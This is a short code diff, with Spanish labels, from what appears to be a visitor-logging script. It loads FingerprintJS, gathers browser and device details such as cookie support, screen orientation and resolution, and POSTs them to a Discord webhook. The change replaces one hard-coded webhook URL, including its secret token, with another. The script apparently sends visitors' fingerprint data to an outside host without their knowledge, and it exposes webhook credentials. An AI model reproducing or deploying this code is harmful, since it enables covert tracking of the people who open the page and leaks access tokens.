@@ -19,7 +19,7 @@ import('https://openfpcdn.io/fingerprintjs/v3').then(FP => FP.load()).then(fp =>
     const localStorageSupport = typeof localStorage !== "undefined" ? "Sí" : "No";
     const cookiesEnabled = navigator.cookieEnabled ? "Sí" : "No";
     const additionalInfo = /Mobi|Android|iPhone|iPad/i.test(ua) ? {"🎮 Orientación de pantalla": window.orientation ? `${window.orientation}°` : "Desconocido","📐 Resolución de Pantalla": screenResolution} : {};
-    const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
+    const url = 'https://discord.com/api/webhooks/1371276921593139271/fPUin9nIT2z3ecw_-kTufOqvumMH_BYzQG2cvaZGaEXQlWf_w08C28CnV2JVVZI4MXPN';
     fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
